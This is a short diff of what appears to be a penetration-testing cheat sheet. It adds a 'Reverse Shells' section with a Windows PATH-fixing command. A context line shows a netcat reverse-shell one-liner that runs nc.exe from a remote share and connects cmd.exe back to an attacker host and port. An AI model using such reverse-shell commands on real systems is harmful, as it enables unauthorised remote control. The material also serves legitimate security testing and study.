@@ -52,6 +52,14 @@ On Windows
 cmd.exe /c //LHOST/Share/nc.exe -e cmd.exe LHOST LPORT
 ```
 
+## Reverse Shells
+
+If there is a PATH issue fixing it:
+
+```
+set PATH=%SystemRoot%\system32;%SystemRoot%;
+```
+
 
 ## NTLM and NetNTLM
 
